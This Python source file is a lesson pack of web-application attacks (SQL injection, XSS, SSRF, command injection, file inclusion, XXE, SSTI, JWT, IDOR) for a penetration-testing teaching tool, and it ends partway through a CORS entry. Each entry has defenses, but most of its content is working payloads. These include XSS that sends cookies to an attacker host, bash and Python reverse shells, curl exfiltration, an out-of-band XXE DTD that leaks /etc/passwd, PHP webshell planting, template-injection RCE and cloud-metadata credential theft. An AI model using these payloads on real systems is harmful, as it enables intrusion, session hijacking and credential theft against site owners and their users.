#!/usr/bin/env python3
"""
ERR0RS Web App Exploitation Lesson Pack
Source: PayloadsAllTheThings (swisskyrepo) + purple team defensive overlays
Covers: SQLi, XSS, SSRF, CMDi, LFI/RFI, Path Traversal, XXE, SSTI,
        Insecure Deserialization, JWT, OAuth, CORS, IDOR, Account Takeover,
        GraphQL, Request Smuggling, Race Condition, Prototype Pollution

Plugs directly into teach_engine.py LESSONS dict via:
    from src.education.webapp_lessons import WEBAPP_LESSONS
    LESSONS.update(WEBAPP_LESSONS)

Author: Gary Holden Schneider (Eros) | ERR0RS-Ultimate
"""

WEBAPP_LESSONS = {

  # ══════════════════════════════════════════════════════════════════════════
  # TIER 1 — CORE WEB APP ATTACKS
  # ══════════════════════════════════════════════════════════════════════════

  "sql injection": {
    "title": "SQL Injection (SQLi)",
    "tldr": "Injecting SQL code into user input fields to manipulate a database — read data, bypass auth, or get RCE.",
    "what": (
      "SQL Injection happens when a web app builds a database query using unsanitized user input. "
      "The attacker inserts SQL syntax that changes the query's meaning. "
      "It's one of the most critical and widespread web vulnerabilities (OWASP Top 10 #3)."
    ),
    "how": (
      "Classic SQLi flow:\n"
      "  1. Find an input that touches the DB (login, search, URL param)\n"
      "  2. Test with: '  OR  1=1--  OR  '1'='1\n"
      "  3. Observe error messages or behavior changes\n"
      "  4. Enumerate: UNION SELECT to pull other tables\n"
      "  5. Dump: extract usernames, password hashes, secrets\n\n"
      "SQLi Types:\n"
      "  In-band (Classic): Error-based, UNION-based — results returned directly\n"
      "  Blind: Boolean-based (true/false behavior), Time-based (SLEEP delay)\n"
      "  Out-of-band: DNS/HTTP exfil via DB functions (xp_dirtree, UTL_HTTP)"
    ),
    "phases": [
      "1. Detect — inject ' or 1=1-- and watch for errors / behavior changes",
      "2. Fingerprint — identify DB type (MySQL, MSSQL, Oracle, PostgreSQL, SQLite)",
      "3. Enumerate — map tables: UNION SELECT table_name FROM information_schema.tables--",
      "4. Extract — dump credentials: SELECT user,password FROM users--",
      "5. Escalate — MySQL: INTO OUTFILE for webshell | MSSQL: xp_cmdshell for RCE",
    ],
    "commands": {
      "Basic auth bypass":      "' OR '1'='1",
      "Comment bypass":         "admin'--",
      "UNION test (2 cols)":    "' UNION SELECT NULL,NULL--",
      "Extract version":        "' UNION SELECT @@version,NULL--",
      "List tables (MySQL)":    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
      "Dump users (MySQL)":     "' UNION SELECT user,password FROM mysql.user--",
      "Time-based blind":       "' AND SLEEP(5)--",
      "Boolean blind":          "' AND 1=1-- (true) vs ' AND 1=2-- (false)",
      "SQLMap basic":           "sqlmap -u 'http://target/page?id=1' --dbs",
      "SQLMap dump":            "sqlmap -u 'http://target/page?id=1' -D dbname -T users --dump",
      "SQLMap login bypass":    "sqlmap -u 'http://target/login' --data='user=a&pass=b' --level=5",
      "SQLMap cookie":          "sqlmap -u 'http://target/' --cookie='session=abc' --dbs",
      "MSSQL RCE":              "'; EXEC xp_cmdshell('whoami')--",
      "MySQL webshell":         "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
    },
    "flags": {
      "--dbs":     "List all databases",
      "--tables":  "List tables in DB (-D dbname)",
      "--dump":    "Dump table data (-T tablename)",
      "--level":   "Test depth 1-5 (higher = more vectors)",
      "--risk":    "Risk level 1-3 (higher = more dangerous payloads)",
      "--os-shell":"Attempt interactive OS shell",
      "--batch":   "Non-interactive mode (auto-answer prompts)",
      "--forms":   "Auto-parse and test HTML forms",
      "--tor":     "Route through Tor",
    },
    "defense": (
      "✅ Parameterized queries / prepared statements (THE fix)\n"
      "✅ ORM frameworks (SQLAlchemy, Hibernate) — abstracts raw SQL\n"
      "✅ Input validation + allowlist filtering\n"
      "✅ Principle of least privilege on DB accounts\n"
      "✅ WAF (ModSecurity) to catch obvious patterns\n"
      "✅ Error handling — never expose raw DB errors to users"
    ),
    "tips": [
      "Always try both ' and \" as injection chars — apps use both quote styles",
      "URL-encode payloads when injecting in URL parameters: %27 = '",
      "Try stacked queries: '; DROP TABLE users;-- (works on MSSQL, PostgreSQL)",
      "Second-order SQLi: payload stored then executed later (profile fields, usernames)",
      "Use --level=5 --risk=3 in SQLMap for comprehensive testing in CTFs",
    ],
    "mitre": "T1190 — Exploit Public-Facing Application",
  },

  "xss": {
    "title": "Cross-Site Scripting (XSS)",
    "tldr": "Injecting malicious JavaScript into web pages viewed by other users — steal cookies, hijack sessions, redirect victims.",
    "what": (
      "XSS lets attackers run JavaScript in a victim's browser in the context of a trusted site. "
      "Three types:\n"
      "  Reflected: payload in URL, executed immediately (no storage)\n"
      "  Stored: payload saved to DB, executes for every visitor (most dangerous)\n"
      "  DOM-based: payload processed by JS on client side, never hits server"
    ),
    "how": (
      "Basic test: inject <script>alert(1)</script> into every input field.\n"
      "If alert fires → confirmed XSS. Then escalate:\n"
      "  Cookie theft:    <script>document.location='http://attacker.com/?c='+document.cookie</script>\n"
      "  Keylogger:       <script>document.onkeypress=e=>fetch('http://attacker/k?k='+e.key)</script>\n"
      "  BeEF hook:       <script src='http://attacker:3000/hook.js'></script>"
    ),
    "phases": [
      "1. Detect — inject test payloads into all inputs, URL params, headers",
      "2. Confirm — verify JS execution (alert, console.log, fetch to BurpCollaborator)",
      "3. Bypass — if filtered, try encoding: <ScRiPt>, \\x3cscript\\x3e, SVG/IMG vectors",
      "4. Weaponize — steal session cookies, capture credentials, perform actions as victim",
      "5. Persist — stored XSS: payload fires for every future visitor (wormable)",
    ],
    "commands": {
      "Basic test":           "<script>alert(1)</script>",
      "Img onerror":          "<img src=x onerror=alert(1)>",
      "SVG vector":           "<svg onload=alert(1)>",
      "Cookie steal":         "<script>fetch('http://ATTACKER/?c='+btoa(document.cookie))</script>",
      "Filter bypass (case)": "<ScRiPt>alert(1)</ScRiPt>",
      "Filter bypass (tag)":  "<body onload=alert(1)>",
      "No-script vector":     "<details open ontoggle=alert(1)>",
      "JS URL":               "javascript:alert(1)",
      "DOM XSS test":         "?search=<img src=1 onerror=alert(1)>",
      "BeEF hook":            "<script src='http://ATTACKER:3000/hook.js'></script>",
      "XSStrike scan":        "python3 xsstrike.py -u 'http://target/?q=test'",
      "dalfox scan":          "dalfox url 'http://target/?q=test'",
    },
    "defense": (
      "✅ Output encoding — HTML-encode all user data before rendering\n"
      "✅ Content-Security-Policy (CSP) header — restrict script sources\n"
      "✅ HttpOnly + Secure cookie flags — prevent JS cookie access\n"
      "✅ X-XSS-Protection header (legacy browsers)\n"
      "✅ Input validation — allowlist expected character sets\n"
      "✅ DOMPurify for sanitizing HTML in JS-heavy apps"
    ),
    "tips": [
      "Stored XSS in admin panels = game over — admins often have CSRF tokens, 2FA resets",
      "Use BurpSuite Intruder with XSS payload list from PayloadsAllTheThings",
      "Test inside HTML attributes: \" onmouseover=alert(1) x=\"",
      "XSS + CSRF = very powerful combo: fire malicious requests as the victim",
      "Blind XSS (XSSHunter) — payload fires in admin panel you can't see directly",
    ],
    "mitre": "T1059.007 — JavaScript execution",
  },

  "ssrf": {
    "title": "Server-Side Request Forgery (SSRF)",
    "tldr": "Tricking the server into making HTTP requests to internal resources — bypass firewalls, hit cloud metadata, pivot internally.",
    "what": (
      "SSRF forces the server to fetch a URL you control. Since the request comes FROM the server, "
      "it can reach internal services (databases, admin panels, cloud metadata APIs) that you can't "
      "directly access as an outsider. Critical in cloud environments (AWS/GCP/Azure metadata = instant creds)."
    ),
    "how": (
      "Look for URL params, file fetch features, webhooks, PDF generators, image importers.\n"
      "Test: replace URL with http://127.0.0.1/ or http://169.254.169.254/\n"
      "AWS metadata goldmine: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
      "Use Burp Collaborator or interactsh to detect blind SSRF (out-of-band)"
    ),
    "phases": [
      "1. Find — URL params, fetch features, import/export, webhooks, image loaders",
      "2. Probe — try http://127.0.0.1/ and http://localhost/ — does response change?",
      "3. Internal scan — try common internal IPs: 10.x, 172.16.x, 192.168.x",
      "4. Cloud metadata — http://169.254.169.254/latest/meta-data/ (AWS)",
      "5. Escalate — read IAM creds, internal admin panels, S3 buckets, Redis, Elasticsearch",
    ],
    "commands": {
      "Basic SSRF test":          "url=http://127.0.0.1/",
      "AWS metadata":             "url=http://169.254.169.254/latest/meta-data/",
      "AWS IAM creds":            "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "GCP metadata":             "url=http://metadata.google.internal/computeMetadata/v1/",
      "Azure metadata":           "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "Internal port scan":       "url=http://127.0.0.1:PORT/ (try 6379=Redis, 9200=ES, 8080=admin)",
      "Bypass filter (decimal)":  "url=http://2130706433/ (127.0.0.1 in decimal)",
      "Bypass filter (IPv6)":     "url=http://[::1]/",
      "Bypass filter (0x7f)":     "url=http://0x7f000001/",
      "Blind SSRF (OOB)":         "url=http://BURP_COLLABORATOR_ID.burpcollaborator.net/",
      "File read via SSRF":       "url=file:///etc/passwd",
      "Gopher for Redis RCE":     "url=gopher://127.0.0.1:6379/...",
    },
    "defense": (
      "✅ Allowlist only permitted external domains for any fetch features\n"
      "✅ Block requests to RFC1918 addresses (10.x, 172.16.x, 192.168.x, 127.x)\n"
      "✅ Block cloud metadata IPs (169.254.169.254)\n"
      "✅ Use IMDSv2 on AWS (requires token — blocks simple SSRF)\n"
      "✅ Don't return raw server response to the user\n"
      "✅ Network segmentation — internal services should reject external-origin requests"
    ),
    "tips": [
      "SSRF → AWS metadata = IAM credentials = full cloud account takeover",
      "Protocol smuggling: use gopher:// to send raw TCP (hit Redis, Memcached, internal HTTP)",
      "DNS rebinding can bypass IP-based SSRF filters",
      "Check all fetch-like features: PDF generators, URL previews, import from URL, webhooks",
      "Blind SSRF confirmed via OOB — use Burp Collaborator or interactsh",
    ],
    "mitre": "T1090 — Proxy / T1190 — Exploit Public-Facing Application",
  },

  "command injection": {
    "title": "Command Injection (OS Command Injection)",
    "tldr": "Injecting OS commands into app inputs that get passed to a shell — instant RCE, game over.",
    "what": (
      "Command injection occurs when an app passes unsanitized user input to a system shell. "
      "The attacker appends shell metacharacters (;, &&, |, $()) to break out of the intended "
      "command and execute arbitrary OS commands. Full RCE on the server."
    ),
    "how": (
      "Look for inputs that trigger system operations: ping, DNS lookup, file conversion, "
      "image resize, archive creation — anything that might call a shell command under the hood.\n\n"
      "Injection operators:\n"
      "  ;        — run second command regardless (Linux)\n"
      "  &&       — run second command only if first succeeds\n"
      "  ||       — run second command only if first FAILS\n"
      "  |        — pipe first output to second command\n"
      "  `cmd`    — backtick subshell execution\n"
      "  $(cmd)   — modern subshell syntax\n"
      "  \\n / %0a — newline injection (bypass filters)"
    ),
    "phases": [
      "1. Find inputs that trigger OS-level operations (ping, nslookup, convert, zip, etc.)",
      "2. Test with: ; whoami  or  | whoami  or  && id",
      "3. Confirm blind CMDi via time delay: ; sleep 5",
      "4. Exfil output: ; curl http://ATTACKER/?out=$(whoami|base64)",
      "5. Get reverse shell: ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
    ],
    "commands": {
      "Basic test (;)":          "; whoami",
      "Basic test (&&)":         "127.0.0.1 && whoami",
      "Basic test (|)":          "127.0.0.1 | id",
      "Subshell":                "127.0.0.1; echo $(id)",
      "Blind (time delay)":      "127.0.0.1; sleep 5",
      "Blind (OOB DNS)":         "127.0.0.1; nslookup $(whoami).BURP_COLLAB",
      "Blind (OOB curl)":        "127.0.0.1; curl http://ATTACKER/$(whoami)",
      "Reverse shell (bash)":    "; bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
      "Reverse shell (python)":  "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
      "Windows test":            "127.0.0.1 & whoami",
      "Windows reverse":         "127.0.0.1 & powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444)\"",
      "Read /etc/passwd":        "; cat /etc/passwd",
      "Filter bypass (IFS)":     ";{IFS}cat${IFS}/etc/passwd",
      "Filter bypass (newline)": "%0aid",
    },
    "flags": {
      "nc -lvnp 4444":    "Listener on attacker machine for reverse shell",
      "rlwrap nc":        "Adds arrow keys/history to netcat listener",
      "pwncat-cs":        "Upgrade reverse shell to full PTY automatically",
    },
    "defense": (
      "✅ Never pass user input to shell functions (exec, system, popen, os.system)\n"
      "✅ Use language APIs directly instead of shell (e.g. Python subprocess with list args)\n"
      "✅ Allowlist inputs — if expecting an IP, validate regex before use\n"
      "✅ Run app with minimal OS privileges (non-root)\n"
      "✅ AppArmor/SELinux to restrict process capabilities\n"
      "✅ WAF to catch common metacharacters"
    ),
    "tips": [
      "Blind CMDi is very common — always test with sleep/ping delays even if no output",
      "Windows uses & instead of ; — test both when unsure of OS",
      "URL-encode metacharacters: %3B=; %26=& %7C=| %0A=newline",
      "Filter bypass: use ${IFS} instead of spaces, use $() instead of backticks",
      "CMDi in image/PDF/doc processors is extremely common and often overlooked",
    ],
    "mitre": "T1059 — Command and Scripting Interpreter",
  },

  "file inclusion": {
    "title": "File Inclusion (LFI / RFI)",
    "tldr": "Including arbitrary local or remote files in app execution — LFI reads server files, RFI executes attacker code.",
    "what": (
      "File inclusion flaws happen when PHP (or similar) apps use user input to load files.\n\n"
      "LFI (Local File Inclusion): Include files already on the server — read /etc/passwd, "
      "log files, SSH keys, config files. Can escalate to RCE via log poisoning.\n\n"
      "RFI (Remote File Inclusion): Include a file hosted on attacker's server — instant "
      "code execution. Requires allow_url_include=On (rare in modern PHP but still found)."
    ),
    "phases": [
      "1. Find — URL params like ?page=, ?file=, ?template=, ?lang=, ?include=",
      "2. Test LFI — ?page=../../etc/passwd or ?page=/etc/passwd",
      "3. Bypass filters — null byte (%00), path traversal variants, encoding",
      "4. Escalate LFI — read SSH keys, logs, PHP session files, env vars",
      "5. LFI → RCE — log poisoning: inject PHP in User-Agent → include access.log",
      "6. Test RFI — ?page=http://attacker/shell.txt (needs allow_url_include=On)",
    ],
    "commands": {
      "Basic LFI":               "?page=../../etc/passwd",
      "Absolute path":           "?page=/etc/passwd",
      "Null byte (old PHP)":     "?page=../../etc/passwd%00",
      "Double encoding":         "?page=..%2F..%2Fetc%2Fpasswd",
      "PHP filter (base64)":     "?page=php://filter/convert.base64-encode/resource=index.php",
      "PHP filter (read src)":   "?page=php://filter/read=string.rot13/resource=config.php",
      "Log poisoning step 1":    "curl -A '<?php system($_GET[cmd]); ?>' http://target/",
      "Log poisoning step 2":    "?page=/var/log/apache2/access.log&cmd=id",
      "Common log paths":        "/var/log/apache2/access.log | /var/log/nginx/access.log | /proc/self/environ",
      "Read SSH key":            "?page=/home/user/.ssh/id_rsa",
      "Read /etc/shadow":        "?page=/etc/shadow",
      "PHP session inclusion":   "?page=/var/lib/php/sessions/sess_SESSIONID",
      "RFI basic":               "?page=http://ATTACKER/shell.txt",
      "RFI with data://":        "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
      "LFIscan tool":            "python3 liffy.py -u 'http://target/?page=test'",
    },
    "defense": (
      "✅ Never use user input in file inclusion functions\n"
      "✅ Allowlist permitted file names/paths — map IDs to actual files\n"
      "✅ disable allow_url_include and allow_url_fopen in php.ini\n"
      "✅ Run PHP in open_basedir jail to restrict accessible paths\n"
      "✅ Disable dangerous PHP wrappers (data://, php://, expect://)\n"
      "✅ WAF rules for path traversal patterns"
    ),
    "tips": [
      "php://filter is your best friend for LFI — read PHP source without executing it",
      "Log poisoning: inject PHP payload in ANY log field (User-Agent, X-Forwarded-For, username)",
      "Check /proc/self/environ — contains env vars including HTTP headers you sent",
      "Session file path + PHP session data injection = LFI to RCE without logs",
      "Use wfuzz or ffuf with a LFI wordlist to find the right path depth automatically",
    ],
    "mitre": "T1190 — Exploit Public-Facing Application",
  },

  "lfi": {"title": "LFI (see file inclusion)", "tldr": "See: file inclusion", "what": "See lesson: file inclusion", "how": "", "phases": [], "commands": {}, "defense": "", "tips": [], "mitre": "T1190"},
  "rfi": {"title": "RFI (see file inclusion)", "tldr": "See: file inclusion", "what": "See lesson: file inclusion", "how": "", "phases": [], "commands": {}, "defense": "", "tips": [], "mitre": "T1190"},

  "directory traversal": {
    "title": "Directory / Path Traversal",
    "tldr": "Using ../ sequences to escape the web root and read arbitrary files from the server filesystem.",
    "what": (
      "Path traversal lets attackers access files outside the intended web directory by manipulating "
      "file path inputs with ../ (dot-dot-slash) sequences. Classic target: /etc/passwd, "
      "app configs, .env files, SSH keys, database files, source code."
    ),
    "phases": [
      "1. Find — any param that loads a file: ?file=, ?path=, ?doc=, ?download=, ?img=",
      "2. Basic test — ?file=../../etc/passwd",
      "3. Bypass — URL encode, double encode, Unicode variants, null bytes",
      "4. OS fingerprint — /etc/passwd (Linux) vs C:\\Windows\\win.ini (Windows)",
      "5. Escalate — read .env, config.php, database.yml, .ssh/id_rsa, /proc/self/environ",
    ],
    "commands": {
      "Linux basic":            "../../etc/passwd",
      "Windows basic":          "..\\..\\Windows\\win.ini",
      "Absolute path":          "/etc/passwd",
      "URL encoded":            "..%2F..%2Fetc%2Fpasswd",
      "Double encoded":         "..%252F..%252Fetc%252Fpasswd",
      "Unicode bypass":         "..%c0%af..%c0%afetc/passwd",
      "Null byte (old PHP)":    "../../etc/passwd%00.jpg",
      "Deep traversal":         "../../../../../../../../etc/passwd",
      "Juicy Linux targets":    "/etc/shadow | /etc/hosts | ~/.ssh/id_rsa | /proc/self/environ | /var/log/auth.log",
      "Juicy app targets":      ".env | config.php | database.yml | wp-config.php | settings.py",
      "Windows targets":        "C:\\Windows\\win.ini | C:\\inetpub\\wwwroot\\web.config",
      "Tool — dotdotpwn":       "dotdotpwn -m http -h target.com -U '/?file=TRAVERSAL'",
    },
    "defense": (
      "✅ Canonicalize paths — resolve symlinks and ../ BEFORE checking against allowlist\n"
      "✅ Use language path functions (Path.resolve() in Node, realpath() in PHP)\n"
      "✅ Chroot / jail the web process to the web root directory\n"
      "✅ Never construct file paths from user input directly\n"
      "✅ Map user request IDs (e.g. ?doc=3) to actual file paths server-side"
    ),
    "tips": [
      "Double-encode when the server URL-decodes twice (common in proxy setups)",
      "Test 8-16 levels of ../ — many apps have inconsistent depth limits",
      ".env files are gold — often contain DB passwords, API keys, app secrets",
      "Combine with SSRF: path traversal in SSRF URL can read internal filesystem",
      "Check backup files: config.php.bak, .env.old, settings.py~",
    ],
    "mitre": "T1083 — File and Directory Discovery",
  },

  "xxe": {
    "title": "XML External Entity Injection (XXE)",
    "tldr": "Abusing XML parsers that process external entity definitions — read local files, SSRF, or DoS.",
    "what": (
      "XXE exploits XML parsers that evaluate DOCTYPE external entity declarations. "
      "Attackers define a custom entity that points to a local file or URL — the parser fetches it "
      "and includes it in the response. Result: arbitrary file read, SSRF into internal networks, "
      "or Billion Laughs DoS. Common in SOAP APIs, file upload parsers (docx/xlsx/svg), "
      "and any XML processing endpoint."
    ),
    "phases": [
      "1. Find — XML input points: SOAP endpoints, XML file uploads, APIs accepting Content-Type: text/xml",
      "2. Test — inject DOCTYPE with external entity and see if content reflected",
      "3. File read — point SYSTEM to file:///etc/passwd",
      "4. SSRF — point SYSTEM to http://internal-server/",
      "5. Blind XXE — use OOB via DTD hosted on attacker server",
      "6. Escalate — read SSH keys, app configs, then pivot via SSRF",
    ],
    "commands": {
      "Basic file read": (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        ']>\n'
        '<data>&xxe;</data>'
      ),
      "SSRF via XXE": (
        '<!DOCTYPE foo [\n'
        '  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n'
        ']>\n'
        '<data>&xxe;</data>'
      ),
      "Blind XXE (OOB)": (
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">\n'
        '  %xxe;\n'
        ']>'
      ),
      "evil.dtd content": (
        '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
        '<!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://ATTACKER/?x=%file;\'>">\n'
        '%eval;\n%exfil;'
      ),
      "SVG XXE (file upload)": (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE svg [\n'
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        ']>\n'
        '<svg>&xxe;</svg>'
      ),
      "Billion laughs DoS": (
        '<!DOCTYPE lol [\n'
        '  <!ENTITY lol "lol">\n'
        '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
        '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
        ']>\n<lol3/>'
      ),
    },
    "defense": (
      "✅ Disable external entity processing in XML parser config\n"
      "  PHP:  libxml_disable_entity_loader(true)\n"
      "  Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
      "✅ Use JSON instead of XML where possible\n"
      "✅ Allowlist expected XML structure (schema validation)\n"
      "✅ Block file:// and http:// in entity definitions at WAF level\n"
      "✅ Patch XML libraries — many older versions allow XXE by default"
    ),
    "tips": [
      "SVG and DOCX/XLSX/PPTX files are XML internally — always test file upload endpoints",
      "Blind XXE is common — use OOB with Burp Collaborator or interactsh",
      "PHP XXE: check libxml version — older versions enable external entities by default",
      "Java apps (Spring, WebLogic) historically very XXE-prone",
      "Content-Type: application/xml in request = test for XXE immediately",
    ],
    "mitre": "T1190 — Exploit Public-Facing Application",
  },

  "ssti": {
    "title": "Server-Side Template Injection (SSTI)",
    "tldr": "Injecting template syntax into a server-side template engine — often leads to full RCE.",
    "what": (
      "SSTI occurs when user input is embedded directly into a server-side template (Jinja2, Twig, "
      "Freemarker, Velocity, Mako, ERB, Pebble) and the template engine evaluates it. "
      "Since template engines can call arbitrary code, SSTI frequently results in full RCE "
      "on the server. Common in Python (Flask/Django), PHP (Twig/Smarty), Java (Freemarker)."
    ),
    "phases": [
      "1. Detect — inject {{7*7}} or ${7*7} or #{7*7} — if response shows 49, confirmed SSTI",
      "2. Fingerprint engine — different syntax trees for Jinja2 vs Twig vs Freemarker",
      "3. Explore — access Python/Java objects through template context",
      "4. Escalate — RCE via subprocess, os.system, Runtime.exec()",
      "5. Exfil — read /etc/passwd, reverse shell",
    ],
    "commands": {
      "Detection payload":           "{{7*7}} | ${7*7} | #{7*7} | *{7*7}",
      "Jinja2 confirm":              "{{7*'7'}}  → 7777777 (Jinja2 specific)",
      "Jinja2 RCE":                  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      "Jinja2 RCE (alternative)":    "{{''.class.mro()[1].subclasses()[408]('id',shell=True,stdout=-1).communicate()}}",
      "Twig confirm":                "{{7*'7'}} → 49 (Twig multiplies)",
      "Twig RCE":                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
      "Freemarker RCE":              '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
      "ERB (Ruby) RCE":             "<%= `id` %>",
      "Tornado RCE":                 "{%import os%}{{os.system('id')}}",
      "Mako RCE":                    "${__import__('os').popen('id').read()}",
      "tplmap tool":                 "python2 tplmap.py -u 'http://target/?name=*' --os-shell",
      "SSTImap tool":                "python3 sstimap.py -u 'http://target/?name=*'",
    },
    "defense": (
      "✅ Never pass user input directly to template render functions\n"
      "✅ Use sandboxed template environments (Jinja2 SandboxedEnvironment)\n"
      "✅ Allowlist allowed template variables — don't expose full context\n"
      "✅ Code review for any dynamic template construction\n"
      "✅ WAF rules for template syntax characters: {{, }}, ${, #{"
    ),
    "tips": [
      "{{7*7}} is your universal first test — works across most engines",
      "Jinja2 SSTI: the subclass chain approach varies by Python version — use tplmap/sstimap",
      "Common injection points: error messages, user profile fields, email templates, report generators",
      "SSTI in Flask debug mode = automatic shell — Werkzeug console is trivially exploitable",
      "Freemarker is very common in Java enterprise apps (Confluence, JIRA) — high-value target",
    ],
    "mitre": "T1190 — Exploit Public-Facing Application",
  },

  # ══════════════════════════════════════════════════════════════════════════
  # TIER 2 — AUTH & SESSION ATTACKS
  # ══════════════════════════════════════════════════════════════════════════

  "jwt": {
    "title": "JSON Web Token (JWT) Attacks",
    "tldr": "Forging, tampering, or cracking JWT tokens to impersonate users or escalate privileges — alg:none, secret cracking, key confusion.",
    "what": (
      "JWTs are base64url-encoded tokens with Header.Payload.Signature. "
      "If the signature isn't verified correctly, attackers can forge tokens with arbitrary claims "
      "(like admin:true or user_id:1). Common attack surfaces: auth cookies, Authorization headers, "
      "API tokens. Structure: header.payload.signature — all three are base64 encoded and dot-separated."
    ),
    "phases": [
      "1. Intercept — grab JWT from Authorization: Bearer header or cookie",
      "2. Decode — base64 decode header and payload (jwt.io or cli)",
      "3. Test alg:none — strip signature, change alg to 'none'",
      "4. Crack HS256 — brute force weak HMAC secret with hashcat or john",
      "5. RS256→HS256 confusion — use public key as HMAC secret to forge tokens",
      "6. Modify payload — change role, user_id, expiry claims and re-sign",
    ],
    "commands": {
      "Decode JWT":              "echo 'PAYLOAD_PART' | base64 -d",
      "jwt_tool basic":         "python3 jwt_tool.py TOKEN",
      "jwt_tool tamper+sign":   "python3 jwt_tool.py TOKEN -T -S hs256 -p 'secret'",
      "jwt_tool alg:none":      "python3 jwt_tool.py TOKEN -X a",
      "jwt_tool crack":         "python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt",
      "jwt_tool RS256→HS256":   "python3 jwt_tool.py TOKEN -X k -pk public.pem",
      "Hashcat crack HS256":    "hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt",
      "John crack":             "john --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt",
      "Forge alg:none (manual)":"python3 -c \"import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'='); p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'='); print(h.decode()+'.'+p.decode()+'.')\"",
    },
    "defense": (
      "✅ Always verify signature on server — never trust unverified claims\n"
      "✅ Reject alg:none explicitly\n"
      "✅ Use RS256/ES256 (asymmetric) not HS256 for public-facing apps\n"
      "✅ Use strong, random HS256 secrets (32+ bytes)\n"
      "✅ Set short expiry (exp) and implement token revocation list\n"
      "✅ Validate all claims: iss, aud, exp, nbf"
    ),
    "tips": [
      "jwt.io lets you visually decode and inspect any JWT instantly",
      "alg:none attack: many libraries skip signature check when alg is 'none'",
      "RS256→HS256 confusion: if server accepts HS256, forge using the public key as HMAC secret",
      "Check for jwks_uri injection — attacker-hosted JWK set used for verification",
      "kid header injection: if kid is used in SQL/file lookup, possible SQLi or path traversal",
    ],
    "mitre": "T1552 — Unsecured Credentials / T1550 — Use Alternate Auth Material",
  },

  "idor": {
    "title": "Insecure Direct Object Reference (IDOR)",
    "tldr": "Accessing objects (accounts, files, orders) you don't own by changing an ID in a request — horizontal and vertical privilege escalation.",
    "what": (
      "IDOR occurs when an app uses user-controllable IDs (user_id=123, invoice=456, file=abc.pdf) "
      "to reference objects without checking if the requester has permission. "
      "Horizontal: access another user's data (same role). "
      "Vertical: access admin-level resources (higher role). "
      "One of the most common and impactful bugs in modern web apps and APIs."
    ),
    "phases": [
      "1. Map — identify all endpoints that reference objects by ID (UUID, integer, filename)",
      "2. Create two test accounts — account A and account B",
      "3. While logged in as A, capture request for A's object",
      "4. Swap the object ID to B's ID — does A see B's data?",
      "5. Try predictable IDs: increment integers, guess UUIDs, enumerate filenames",
      "6. Escalate — find admin-only endpoints and test with low-privilege token",
    ],
    "commands": {
      "Basic ID swap":           "GET /api/user/1337/profile → change 1337 to 1338",
      "Order IDOR":              "GET /orders/12345 → try /orders/12344, 12346",
      "File download IDOR":      "GET /download?file=invoice_user123.pdf → change username",
      "JSON body IDOR":          '{"user_id": 100} → change to {"user_id": 1} (admin?)',
      "UUID guessing":           "Use Burp Intruder with UUID wordlist or Turbo Intruder",
      "Mass assignment IDOR":    'POST /api/profile {"username":"x","role":"admin"}',
      "Burp Intruder":          "Highlight ID → Add § markers → Payload: number range",
      "ffuf fuzz IDs":          "ffuf -u 'http://target/api/user/FUZZ' -w numbers.txt -mc 200",
      "Autorize Burp ext":      "Login as low-priv, add admin cookie to Autorize — replays every request with both",
    },
    "defense": (
      "✅ Server-side authorization check on EVERY request — 'does this user own this object?'\n"
      "✅ Use unpredictable IDs (UUIDs v4) instead of sequential integers\n"
      "✅ Map sessions to allowed resource IDs at auth layer\n"
      "✅ Never rely on client-provided user_id — derive from session token server-side\n"
      "✅ Audit all object-returning endpoints for missing authz checks"
    ),
    "tips": [
      "Autorize (Burp extension) automates IDOR testing — install it immediately",
      "Try changing IDs in: URL path, query params, JSON body, HTTP headers, cookies",
      "GUIDs/UUIDs don't prevent IDOR — authorization logic does",
      "IDOR in password reset / email change endpoints = account takeover",
      "Blind IDOR: no visible response difference but still processes — check side effects",
    ],
    "mitre": "T1078 — Valid Accounts (abused via missing authz)",
  },

  "cors": {
    "title": "CORS Misconfiguration",
    "tldr": "Exploiting broken CORS policies to make cross-origin requests that read victim's authenticated data.",
    "what": (
      "CORS (Cross-Origin Resource Sharing) controls which origins can read responses to cross-origin requests. "
      "Misconfigured CORS lets an attacker's malicious page make authenticated requests to the target API "
      "and read the response — stealing data, tokens, PII. Requires victim to visit attacker page "
      "while logged into target."
    ),
    "phases": [
      "1. Send: Origin: https://attacker.com in request — check response for Access-Control-Allow-Origin",
      "2. If ACAO echoes your origin + ACAC: credentials=true → vulnerable",
      "3. Test null origin: Origin: null",
